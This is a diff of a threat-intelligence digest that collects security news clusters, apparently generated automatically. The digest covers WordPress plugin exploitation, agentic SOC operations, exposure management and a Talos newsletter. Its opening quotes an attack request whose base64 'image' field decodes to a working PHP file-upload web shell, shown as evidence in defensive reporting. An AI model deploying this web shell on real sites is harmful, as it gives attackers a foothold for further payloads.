"data:image/gif;base64,PD9waHAgaWYoaXNzZXQoJF9GSUxFU1siZmlsZSJdKSl7JHRhcmdldD1iYXNlbmFtZSgkX0ZJTEVTWyJmaWxlIl1bIm5hbWUiXSk7aWYobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImZpbGUiXVsidG1wX25hbWUiXSwkdGFyZ2V0KSl7ZWNobyLinIUgVXBsb2FkZWQ6IDxhIGhyZWY9JyR0YXJnZXQnPiR0YXJnZXQ8L2E+Ijt9ZWxzZXtlY2hvIuKdjCBVcGxvYWQgZmFpbGVkISI7fWV4aXQ7fT8+PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPk11c2hyMDB3IFVwbG9hZGVyPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9ImJhY2tncm91bmQ6IzBhMGEwYTtjb2xvcjojMDBmZjAwO2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7aGVpZ2h0OjEwMHZoO21hcmdpbjowOyI+PGZvcm0gbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBzdHlsZT0iYmFja2dyb3VuZDojMTExO3BhZGRpbmc6NDBweDtib3JkZXI6MnB4IHNvbGlkICMwMGZmMDA7Ym9yZGVyLXJhZGl1czoxMHB4O3RleHQtYWxpZ246Y2VudGVyOyI+PGgyPvCfk6QgVVBMT0FEPC9oMj48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgcmVxdWlyZWQgc3R5bGU9ImJhY2tncm91bmQ6IzBhMGEwYTtjb2xvcjojMDBmZjAwO2JvcmRlcjoxcHggc29saWQgIzAwZmYwMDtwYWRkaW5nOjEwcHg7Ym9yZGVyLXJhZGl1czo1cHg7Ij48YnI+PGJyPjxidXR0b24gdHlwZT0ic3VibWl0IiBzdHlsZT0iYmFja2dyb3VuZDojMDBmZjAwO2NvbG9yOiMwYTBhMGE7cGFkZGluZzoxMHB4IDMwcHg7Ym9yZGVyOm5vbmU7Ym9yZGVyLXJhZGl1czo1cHg7Zm9udC13ZWlnaHQ6Ym9sZDtjdXJzb3I6cG9pbnRlcjsiPuKshiBVcGxvYWQ8L2J1dHRvbj48L2Zvcm0+PC9ib2R5PjwvaHRtbD4=", "value": "Mushr00w_upl.php", "name": "Mushr00w_upl.php", "label": "attachment"}]}} The uploaded file, while prefixed with the "data:image/gif;base64" content type, is a PHP file-uploader web shell ("Mushr00w_upl.php"), which then acts as a conduit to upload additional payloads to the site. Attacks weaponizing the Super Forms plugin have originated from the following IP addresses - 103.168.147.235 103.168.146.131 103.154.152.178 103.170.97.7 182.10.130.51 189.4.122.140 129.227.46.143 64.176.209.104 103.164.182.122 37.9.33.62 The malicious activity is said to have begun on July 14, 2026, before scaling a peak of more than 40,000 exploit requests on August 18, 2026. Exploitation Against CVE-2026-32475 "The attacker submits the form's File Up
+```
+
+#### Corroborating sources (2)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Over 440,000 Exploit Attempts Target Super Forms and Elementor Pro RCE Flaws
+  - Published: 2026-09-04T08:48:45+00:00
+  - Link: https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
+  - Summary: Threat actors are exploiting two critical security flaws in WordPress plugins Super Forms and Elementor Pro, according to findings from Wordfence. The vulnerabilities in question are - CVE-2026-14894 (CVSS score: 9.8) - A missing file type validation vulnerability in Super Forms – Drag & Drop Form Builder that allows unauthenticated attackers to upload files of any type, including
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: Elementor Pro WordPress Plugin Vulnerability Exploited to Hack Sites
+  - Published: 2026-09-05T13:00:28+00:00
+  - Link: https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/
+  - Summary: Tracked as CVE-2026-32475 (CVSS score of 9.8), the bug described as an arbitrary file upload issue in the function that handles form submissions. The post Elementor Pro WordPress Plugin Vulnerability Exploited to Hack Sites appeared first on SecurityWeek .
+
 ### Cluster 4272e95241 — score 10
 
 - Title: Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America
@@ -2682,6 +2675,49 @@ Share Link copied to clipboard! Tags Phishing Social engineering Content types R
   - Link: https://www.microsoft.com/en-us/security/blog/2026/09/03/ascii-smuggling-crosses-over-from-ai-prompt-injection-to-phishing-evasion/
   - Summary: Invisible Unicode characters popularized for hiding instructions from AI models are now being used to obfuscate words before email filters parse them. The post ASCII smuggling crosses over from AI prompt injection to phishing evasion appeared first on Microsoft Security Blog .
 
+### Cluster 8f89f1c57c — score 10
+
+- Title: The Agentic SOC – From AI Theater to Real Defense
+- Source: Recorded Future (threat_research_primary)
+- Published: 2026-09-01T00:00:00+00:00
+- Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ai_security
+- affected_industries: legal_professional
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ai_security
+- affected_industries: legal_professional
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.
+```
+
+#### Full body
+
+```
+The Agentic SOC – From AI Theater to Real Defense Moving beyond "AI theater" with measurable KPIs: Security teams must distinguish between genuine value and "productivity theater." Success requires defining concrete KPIs—such as cost improvement, risk reduction, and speed—to measure true ROI, rather than deploying AI tools without a clear strategic purpose. Mitigate new autonomous risks: The shift to an agentic SOC introduces distinct threats, such as indirect prompt injection, and creates visibility gaps that traditional SIEM platforms are not built to handle. Organizations should shift from post-event observability to proactive control mechanisms, such as placing strict constraints on agent compute and communication. Redefine the analyst’s role for speed at scale: As defensive timelines compress from days to seconds, the fundamental unit of work will evolve from alert handling to agent management. The human role is shifting from a manual processor to an architect, responsible for setting objectives, defining operational constraints, and overseeing the behavior of AI agents. For security teams, AI has generated both more excitement and more confusion than any technology in the last decade. As threat actors experiment with AI to hone their attacks, defenders are trying to determine which AI investments will help them measurably reduce risk. Matthew Farmer, Accenture’s Managing Director of Security Operations in EMEA, joined Recorded Future’s co-founder Christopher Ahlberg and CTO and co-founder Staffan Truvé in a recent discussion to discuss the agentic SOC and what it takes to move from “AI theater” to real defense. Read on to see the key highlights from the discussion. Avoiding the "productivity theater" trap While AI is demonstrably transforming investigation and decision-making layers in SecOps, there’s a significant risk that organizations are falling into what Farmer calls "AI productivity theater." "We can all agree that there's great production value around a lot of AI capabilities and AI products," he said. "But there are also organizations that are really struggling to achieve any kind of return on investment on their AI.” The panel noted that the difference between success and failure doesn’t necessarily have anything to do with being in a regulated or non-regulated industry. It’s more about the ability to move past the theater by defining concrete KPIs. “A lot of what people want to achieve with AI, we can already achieve with existing machine learning or SOAR automation capabilities,” Farmer said. So rather than simply deploying an AI solution for the sake of being AI-enabled, organizations need to ask whether they’re solving for cost improvement, risk reduction, or speed. They need to understand their KPIs so they can measure their true ROI. Navigating technical and operational challenges When it comes to bringing new AI solutions online, the panel noted that SOCs often face administrative, legal, and compliance limitations that eclipse any technical hurdles. They also agreed that data quality and lack of context — “two sides of the same coin” according to Truvé — remain fundamental challenges. Farmer noted that, “In the new world of tokenomics, it costs just as much money to troll through poor quality data as high-quality data.” It’s essential that security organizations feed only the best intelligence into their AI tools. Assessing new risks, from democratization to agentic threats Farmer said that security organizations used to ask a key question: “Do those [threat actors] with the capability have the motive, and do those with the motive have the capability?” We’re now in a world where non-capable threat actors can use AI to capably launch highly sophisticated attacks. Threats are also becoming more structural. The panel highlighted "indirect prompt injection"—where agents are manipulated by the very instructions they read—as a new, distinct threat vector. As companies deploy a digital workforce of AI agents,
+```
+
+#### Corroborating sources (1)
+
+- **Recorded Future** (threat_research_primary)
+  - Title: The Agentic SOC – From AI Theater to Real Defense
+  - Published: 2026-09-01T00:00:00+00:00
+  - Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
+  - Summary: Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.
+
 ### Cluster 439827e1a6 — score 10
 
 - Title: Angry Birds: Toy Ghouls’ new toys
@@ -2813,46 +2849,83 @@ Table of Contents Malicious installer DLL Sideloading via libcef.dll Running the
   - Link: https://securelist.com/valleyrat-backdoor-adware/121175/
   - Summary: Threat actors are distributing the ValleyRAT backdoor disguised as adware. We analyze the infection chain, from the malicious installer to the final payload.
 
-### Cluster 2e68cba663 — score 10
+### Cluster 396a583814 — score 10
 
-- Title: The story behind the intelligence
-- Source: Cisco Talos (threat_research_primary)
-- Published: 2026-09-03T18:00:13+00:00
-- Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
+- Title: What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever
+- Source: Horizon3 Attack Research (offensive_vulnerability_research)
+- Published: 2026-09-04T17:46:19+00:00
+- Link: https://horizon3.ai/intelligence/blogs/fal-con-2026-ai-exposure-validation/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
 - content_type: news_report
-- confidence_tier: tier_1_primary_research
+- confidence_tier: tier_1_offensive_research
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion
 - content_type: news_report
-- confidence_tier: tier_1_primary_research
+- confidence_tier: tier_1_offensive_research
 
 #### Summary
 
 ```
-From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
+AI is accelerating vulnerability discovery, but security teams still need to know which exposures actually matter. Here’s what Fal.Con 2026 reinforced about offensive security, validation, and proving risk.
 ```
 
 #### Full body
 
 ```
-The story behind the intelligence By Hazel Burton Thursday, September 3, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. Our goal is to get accurate threat intelligence to our audience as quickly as possible, with all the context you need to ask the right questions of your own environment: How at risk are we from this threat? Are we prepared for it? And what can we do about it? What you don’t often see is all the... well, frankly, “mess” involved in producing it. All the dead ends we followed until we could confirm those ends were as dead as a doornail. All the work it took to ultimately produce an assessment, supported by evidence and written so that defenders can act on it. Much of that abstraction is necessary. Defenders need intelligence they can use, not a complete account of every conversation we had, or investigative detour behind it. But it can create an overly tidy picture of both cybercrime and the work required to understand it. If you do fancy a look behind the curtain, though, may I recommend our just-published episode of Beers with Talos ? Our guest is Azim Khodjibaev, whose remit is adversary engagement. His work involves developing personas for deep- and dark-web research, engaging directly with threat actors, and building relationships with people who may become (and have been) openly threatening to him. At one point, he was maintaining eight separate personas, some of which were interacting with one another. Azim’s engagements have helped Talos identify prolific cybercriminals and contributed to wider disruption efforts. They have also resulted in ransomware operators placing “Azim sucks” in their code and accusing him of belonging to the very criminal groups he was investigating. His experiences also expose the problem with treating adversaries as uniformly sophisticated operators. Some are technically capable and highly organised. Others are impulsive, ego-driven, or one-trick ponies. Many have a scary detachment from the consequences of their actions. Increasingly, Azim is seeing less-experienced threat actors working through loosely organised online collectives. Intelligence necessarily turns that disorder into something defenders can understand and use. But occasionally, it is worth looking behind the finished product – the patience it takes to get accurate answers, who we are investigating, and the deeply human behaviour that shapes both sides. This Beers with Talos episode, “Eight People Walk Into a Dark Web Forum. They’re All Azim,” isn’t exactly going to help many people in our industry sleep better at night. But for anyone wanting to understand more about the threat we’re up against, as a co-host of the pod I’m biased, but I believe it’s an essential listen. And if that doesn’t inspire you to download the episode, perhaps my live review of trying Flamin’ Hot Cheetos for the very first time (with a chaser of Nerds) will. The one big thing Cisco Talos is highlighting a growing operational hurdle for security teams that we call the AI "safety penalty." As frontier AI models advance, their built-in guardrails are increasingly blocking legitimate defensive tasks. This was evident in July 2026 when Hugging Face's primary cloud LLM refused to analyze forensic data during a breach, delaying their response. While defenders are slowed by these frustrating refusals, adversaries are freely leveraging unconstrained models to attack at machine speed. Why do I care? This guardrail asymmetry hands the advantage directly to attackers. When a cloud-hosted AI model refuses a forensic request mid-incident, defenders lose precious time. Security teams are paying for vendor-imposed limitations without gaining a capability edge, especially as open-weight alternatives close the reasoning gap. Ultimately, relying on third-party alignment policies means a sudden update in Silicon Valley could quietly break your defensive workflows overnight. So now what? Security leadership
+What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever Horizon3 September 4, 2026 Blogs For three days at Fal.Con 2026, Horizon3 was hard to miss across the show floor. Our booth stayed packed, our team ran demo after demo of NodeZero®, dozens of people packed into Snehal Antani’s two sessions, and Ward Holloway’s theater session was standing room only. But the biggest takeaway wasn’t the traffic, the sessions, or even the more than 1,300 Go Hack Yourself shirts we handed out. It was the conversations behind all of it. AI is accelerating vulnerability discovery and compressing the time between discovery and potential exploitation, but security teams already have more vulnerabilities than they can reasonably fix. Finding more of them, faster, only makes one question more important: Which exposures actually matter in my environment? This is a question that came up again and again at Fal.Con. Offense is increasingly informing defense That same thinking showed up on Fal.Con’s biggest stage. In his keynote, CrowdStrike CEO George Kurtz spoke about AI as the new cyber battlefield, offense informing defense, AI red teaming, and the need for a continuous approach to security. Those themes closely reflect something Horizon3 has believed from the beginning: the best way to understand whether your defenses will stand up to an attacker is to attack them yourself. As AI increases attacker speed and scale, defenders need offensive capabilities that continuously test real environments and provide evidence of what attackers can exploit, how far they can get, which controls stop them, and whether remediation worked. That attacker-derived evidence is also central to Horizon3’s integration with Falcon Next-Gen SIEM and the perspective we bring to CrowdStrike’s Project QuiltWorks. AI is accelerating discovery. That makes validation more important. Ward tackled this directly in his session, “Beyond the Mythos Hype.” AI is getting better at finding and validating vulnerabilities, compressing work that once required significant time and expertise. That changes the speed of the problem, but it doesn’t change a fundamental reality for defenders: you cannot fix everything. Security teams already have vulnerability scanners, attack surface management tools, threat intelligence, endpoint telemetry, identity data, and plenty of other signals telling them what could represent risk. Accelerating vulnerability discovery adds even more pressure to an already overloaded system. The challenge is determining which weaknesses create real exposure in your environment, how they can be chained together, and where those attack paths can lead. The standing-room-only crowd for Ward’s session reinforced what we were hearing throughout the show: this challenge is very much on defenders’ minds. Vulnerable does not mean exploitable Snehal approached the same problem from the attacker’s perspective in “Go Hack Yourself. With AI.” His message was straightforward: instead of waiting for attackers to tell you whether your defenses work, continuously attack yourself to find out. That means testing the environment to answer questions vulnerability data alone cannot. Can a vulnerability actually be exploited? Can a credential be abused? Can an attacker move laterally or escalate privileges? Do your security controls stop them? Can several seemingly unrelated weaknesses be chained together to reach something that matters? The answers can materially change what gets fixed first. A critical vulnerability that isn’t proven exploitable in your environment may deserve a very different response from a weakness buried somewhere in a scanner backlog that provides a proven path to critical systems or data. The goal isn’t another score. It’s evidence security teams can use to decide what matters, take action, and then prove that action worked. That closed loop is what continuous exposure management ultimately requires. That’s the idea behind Hack. Fix. Verify. Repe
 ```
 
 #### Corroborating sources (1)
 
-- **Cisco Talos** (threat_research_primary)
-  - Title: The story behind the intelligence
-  - Published: 2026-09-03T18:00:13+00:00
-  - Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
-  - Summary: From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - Title: What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever
+  - Published: 2026-09-04T17:46:19+00:00
+  - Link: https://horizon3.ai/intelligence/blogs/fal-con-2026-ai-exposure-validation/
+  - Summary: AI is accelerating vulnerability discovery, but security teams still need to know which exposures actually matter. Here’s what Fal.Con 2026 reinforced about offensive security, validation, and proving risk.
+
+### Cluster 14562e0782 — score 10
+
+- Title: CTEM Is Not About the Stages. It’s About the Outcome.
+- Source: Horizon3 Attack Research (offensive_vulnerability_research)
+- Published: 2026-09-02T13:11:00+00:00
+- Link: https://horizon3.ai/intelligence/blogs/ctem-outcome-not-stages/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+CTEM is not about filling five technology boxes. It is about continuously reducing exploitable exposure, proving remediation worked, and measuring whether the environment is becoming harder to attack.
+```
+
+#### Full body
+
+```
+CTEM Is Not About the Stages. It’s About the Outcome. Stephen Gates September 2, 2026 Blogs Continuous Threat Exposure Management (CTEM) has a five-stage framework. That does not mean you need five technologies. Yet much of the conversation around CTEM is heading in that direction. Vendors and practitioners increasingly try to map technologies to each stage, assigning products to Scoping, Discovery, Prioritization, and Validation, while treating Mobilization as a problem for workflow and orchestration. Before long, CTEM starts looking like an architecture diagram with five boxes that security teams are expected to fill. That misses the point. CTEM is ultimately about one outcome: continuously reducing exposure. The stages help organize the program. They are not the outcome. The Framework Is Not a Technology Architecture Gartner® defines CTEM through these five stages: Scoping → Discovery → Prioritization → Validation → Mobilization Look at the bookends: Scoping and Mobilization. Scoping starts with organizational decisions about what matters to the business, what should be in scope, and which systems, processes, identities, applications, and potential impacts deserve attention. Mobilization is about getting people to act. Security can provide evidence, guidance, and recommendations, but someone still has to own the problem, decide what to do, implement the change, and manage the operational consequences. Technology supports both, but neither is simply a technology problem. The question isn’t whether you have technology mapped to every CTEM stage. The question is: Are we continuously reducing the exposures attackers can use against us? That changes how you think about the entire program. More Visibility Isn’t the Same as Less Exposure Most organizations already have vulnerability scanners, EASM, CSPM, threat intelligence, risk scoring, identity tooling, endpoint controls, ticketing systems, and remediation workflows generating enormous amounts of information about exposure. The problem is turning that information into action. Discovery illustrates the challenge. A mature security program can identify enormous numbers of vulnerabilities, misconfigurations, exposed assets, identity risks, and other potential weaknesses. You need that coverage to understand where exposure might exist, but more visibility does not automatically create more understanding. A vulnerability can have a critical severity score and still be difficult or impossible to exploit in a particular environment. Another issue that appears relatively unimportant on its own may become consequential when combined with a weak credential, excessive privilege, a misconfiguration, or another weakness. Visibility tells you what could be a problem. It doesn’t tell you what an attacker can actually do. That’s why exposure management can’t stop at discovery. Validation Changes the Conversation Security teams have spent years trying to improve prioritization with better signals, including severity scores, threat intelligence, asset criticality, Known Exploited Vulnerabilities, exploit prediction, and business context. These signals are valuable because they help teams decide where to focus. But they are still signals. Validation adds evidence. Can the weakness actually be exploited in your environment? Can multiple weaknesses be chained together? Can an attacker move laterally or escalate privileges? Can they reach sensitive systems or data? Do the controls expected to stop the attack actually work? Once you know those answers, prioritization becomes less subjective. You’re no longer deciding solely on what might create risk. You have evidence showing what an attacker can actually achieve. The backlog can shrink accordingly, allowing teams to focus on validated exposures based on the criticality of affected systems, access gained, ability to move laterally, and potential impact to data, operations, or customers. Validation turns exposure data into evidence for action. Finding
+```
+
+#### Corroborating sources (1)
+
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - Title: CTEM Is Not About the Stages. It’s About the Outcome.
+  - Published: 2026-09-02T13:11:00+00:00
+  - Link: https://horizon3.ai/intelligence/blogs/ctem-outcome-not-stages/
+  - Summary: CTEM is not about filling five technology boxes. It is about continuously reducing exploitable exposure, proving remediation worked, and measuring whether the environment is becoming harder to attack.
 
 ### Cluster bbea7197be — score 10
 
@@ -2995,6 +3068,47 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 31th Augus
   - Link: https://research.checkpoint.com/2026/31th-august-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 31st August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Manchester Airports Group, the UK operator of Manchester, London Stansted, and East Midlands airports, has disclosed a cyberattack that exposed data belonging to about 8.7 million customers. The compromised information includes contact details, […] The post 31th August – Threat Intelligence Report appeared first on Check Point Research .
 
+### Cluster 2e68cba663 — score 10
+
+- Title: The story behind the intelligence
+- Source: Cisco Talos (threat_research_primary)
+- Published: 2026-09-03T18:00:13+00:00
+- Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
+```
+
+#### Full body
+
+```
+The story behind the intelligence By Hazel Burton Thursday, September 3, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. Our goal is to get accurate threat intelligence to our audience as quickly as possible, with all the context you need to ask the right questions of your own environment: How at risk are we from this threat? Are we prepared for it? And what can we do about it? What you don’t often see is all the... well, frankly, “mess” involved in producing it. All the dead ends we followed until we could confirm those ends were as dead as a doornail. All the work it took to ultimately produce an assessment, supported by evidence and written so that defenders can act on it. Much of that abstraction is necessary. Defenders need intelligence they can use, not a complete account of every conversation we had, or investigative detour behind it. But it can create an overly tidy picture of both cybercrime and the work required to understand it. If you do fancy a look behind the curtain, though, may I recommend our just-published episode of Beers with Talos ? Our guest is Azim Khodjibaev, whose remit is adversary engagement. His work involves developing personas for deep- and dark-web research, engaging directly with threat actors, and building relationships with people who may become (and have been) openly threatening to him. At one point, he was maintaining eight separate personas, some of which were interacting with one another. Azim’s engagements have helped Talos identify prolific cybercriminals and contributed to wider disruption efforts. They have also resulted in ransomware operators placing “Azim sucks” in their code and accusing him of belonging to the very criminal groups he was investigating. His experiences also expose the problem with treating adversaries as uniformly sophisticated operators. Some are technically capable and highly organised. Others are impulsive, ego-driven, or one-trick ponies. Many have a scary detachment from the consequences of their actions. Increasingly, Azim is seeing less-experienced threat actors working through loosely organised online collectives. Intelligence necessarily turns that disorder into something defenders can understand and use. But occasionally, it is worth looking behind the finished product – the patience it takes to get accurate answers, who we are investigating, and the deeply human behaviour that shapes both sides. This Beers with Talos episode, “Eight People Walk Into a Dark Web Forum. They’re All Azim,” isn’t exactly going to help many people in our industry sleep better at night. But for anyone wanting to understand more about the threat we’re up against, as a co-host of the pod I’m biased, but I believe it’s an essential listen. And if that doesn’t inspire you to download the episode, perhaps my live review of trying Flamin’ Hot Cheetos for the very first time (with a chaser of Nerds) will. The one big thing Cisco Talos is highlighting a growing operational hurdle for security teams that we call the AI "safety penalty." As frontier AI models advance, their built-in guardrails are increasingly blocking legitimate defensive tasks. This was evident in July 2026 when Hugging Face's primary cloud LLM refused to analyze forensic data during a breach, delaying their response. While defenders are slowed by these frustrating refusals, adversaries are freely leveraging unconstrained models to attack at machine speed. Why do I care? This guardrail asymmetry hands the advantage directly to attackers. When a cloud-hosted AI model refuses a forensic request mid-incident, defenders lose precious time. Security teams are paying for vendor-imposed limitations without gaining a capability edge, especially as open-weight alternatives close the reasoning gap. Ultimately, relying on third-party alignment policies means a sudden update in Silicon Valley could quietly break your defensive workflows overnight. So now what? Security leadership
+```
+
+#### Corroborating sources (1)
+
+- **Cisco Talos** (threat_research_primary)
+  - Title: The story behind the intelligence
+  - Published: 2026-09-03T18:00:13+00:00
+  - Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
+  - Summary: From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
+
 ### Cluster e3b723fac5 — score 10
 
 - Title: This month in security with Tony Anscombe – August 2026 edition
@@ -3037,127 +3151,6 @@ Video This month in security with Tony Anscombe – August 2026 edition Details 
   - Published: 2026-08-31T08:55:00+00:00
   - Link: https://www.welivesecurity.com/en/videos/month-security-tony-anscombe-august-2026/
   - Summary: Details about the Hugging Face hack, critical infrastructure under attack, a spoofed in-flight Wi-Fi network, and more of this month's cybersecurity news
-
-### Cluster 396a583814 — score 10
-
-- Title: What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever
-- Source: Horizon3 Attack Research (offensive_vulnerability_research)
-- Published: 2026-09-04T17:46:19+00:00
-- Link: https://horizon3.ai/intelligence/blogs/fal-con-2026-ai-exposure-validation/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-AI is accelerating vulnerability discovery, but security teams still need to know which exposures actually matter. Here’s what Fal.Con 2026 reinforced about offensive security, validation, and proving risk.
-```
-
-#### Full body
-
-```
-What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever Horizon3 September 4, 2026 Blogs For three days at Fal.Con 2026, Horizon3 was hard to miss across the show floor. Our booth stayed packed, our team ran demo after demo of NodeZero®, dozens of people packed into Snehal Antani’s two sessions, and Ward Holloway’s theater session was standing room only. But the biggest takeaway wasn’t the traffic, the sessions, or even the more than 1,300 Go Hack Yourself shirts we handed out. It was the conversations behind all of it. AI is accelerating vulnerability discovery and compressing the time between discovery and potential exploitation, but security teams already have more vulnerabilities than they can reasonably fix. Finding more of them, faster, only makes one question more important: Which exposures actually matter in my environment? This is a question that came up again and again at Fal.Con. Offense is increasingly informing defense That same thinking showed up on Fal.Con’s biggest stage. In his keynote, CrowdStrike CEO George Kurtz spoke about AI as the new cyber battlefield, offense informing defense, AI red teaming, and the need for a continuous approach to security. Those themes closely reflect something Horizon3 has believed from the beginning: the best way to understand whether your defenses will stand up to an attacker is to attack them yourself. As AI increases attacker speed and scale, defenders need offensive capabilities that continuously test real environments and provide evidence of what attackers can exploit, how far they can get, which controls stop them, and whether remediation worked. That attacker-derived evidence is also central to Horizon3’s integration with Falcon Next-Gen SIEM and the perspective we bring to CrowdStrike’s Project QuiltWorks. AI is accelerating discovery. That makes validation more important. Ward tackled this directly in his session, “Beyond the Mythos Hype.” AI is getting better at finding and validating vulnerabilities, compressing work that once required significant time and expertise. That changes the speed of the problem, but it doesn’t change a fundamental reality for defenders: you cannot fix everything. Security teams already have vulnerability scanners, attack surface management tools, threat intelligence, endpoint telemetry, identity data, and plenty of other signals telling them what could represent risk. Accelerating vulnerability discovery adds even more pressure to an already overloaded system. The challenge is determining which weaknesses create real exposure in your environment, how they can be chained together, and where those attack paths can lead. The standing-room-only crowd for Ward’s session reinforced what we were hearing throughout the show: this challenge is very much on defenders’ minds. Vulnerable does not mean exploitable Snehal approached the same problem from the attacker’s perspective in “Go Hack Yourself. With AI.” His message was straightforward: instead of waiting for attackers to tell you whether your defenses work, continuously attack yourself to find out. That means testing the environment to answer questions vulnerability data alone cannot. Can a vulnerability actually be exploited? Can a credential be abused? Can an attacker move laterally or escalate privileges? Do your security controls stop them? Can several seemingly unrelated weaknesses be chained together to reach something that matters? The answers can materially change what gets fixed first. A critical vulnerability that isn’t proven exploitable in your environment may deserve a very different response from a weakness buried somewhere in a scanner backlog that provides a proven path to critical systems or data. The goal isn’t another score. It’s evidence security teams can use to decide what matters, take action, and then prove that action worked. That closed loop is what continuous exposure management ultimately requires. That’s the idea behind Hack. Fix. Verify. Repe
-```
-
-#### Corroborating sources (1)
-
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - Title: What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever
-  - Published: 2026-09-04T17:46:19+00:00
-  - Link: https://horizon3.ai/intelligence/blogs/fal-con-2026-ai-exposure-validation/
-  - Summary: AI is accelerating vulnerability discovery, but security teams still need to know which exposures actually matter. Here’s what Fal.Con 2026 reinforced about offensive security, validation, and proving risk.
-
-### Cluster 14562e0782 — score 10
-
-- Title: CTEM Is Not About the Stages. It’s About the Outcome.
-- Source: Horizon3 Attack Research (offensive_vulnerability_research)
-- Published: 2026-09-02T13:11:00+00:00
-- Link: https://horizon3.ai/intelligence/blogs/ctem-outcome-not-stages/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-CTEM is not about filling five technology boxes. It is about continuously reducing exploitable exposure, proving remediation worked, and measuring whether the environment is becoming harder to attack.
-```
-
-#### Full body
-
-```
